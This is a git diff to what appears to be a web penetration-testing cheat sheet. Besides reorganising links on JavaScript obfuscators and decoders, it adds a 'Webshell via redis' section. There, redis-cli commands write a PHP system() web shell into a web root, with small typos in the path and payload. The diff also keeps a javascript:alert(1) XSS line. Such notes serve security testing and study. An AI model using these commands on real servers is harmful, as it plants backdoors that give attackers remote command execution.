@@ -256,15 +256,13 @@ Dom Based
   
 -> javascript:alert(1)
 
-## JavaScript Encoding and Compressor:
+### JavaScript Encoding and Compressor:
 
--> jjencode, aaencode, jsfuck, Minifying
+-> jjencode, aaencode, jsfuck, Minifying,Packer
 
-https://developers.google.com/closure/compiler/
-
--> Packer 
-
-http://dean.edwards.name/packer/
+### Decoder - Obfuscation (PHP and Javascript Decoder)
+  
+https://malwaredecoder.com/
 
 ## Type Juggling
 
@@ -569,6 +567,18 @@ codes/sqli/second_order/script.php
 
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/second-order/script.php
 
+### Webshell via redis
+
+redis-cli -h ip
+
+config set dir /va/www/html
+
+config set dbfilename ok.php
+
+set test "<?php system($_GET['okay'); ?>" 
+
+save
+
 #### Study
 
 https://tryhackme.com/room/sqlilab
@@ -703,11 +713,9 @@ codes/ssrf_protocol_smuggling/zabbix.py
   
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/zabbix.py
 
+Webshell redis
+
 ### Tool's
-
--> Gopher Protocol
-
-https://datatracker.ietf.org/doc/html/rfc1436
 
 -> Gopherus
 
@@ -906,10 +914,6 @@ https://en.wikipedia.org/wiki/List_of_file_signatures
 ### Regex 
   
 https://regex101.com/
-  
-### Decode
-  
-https://malwaredecoder.com/
 
 ### Encode for SQL Injection in Json
   
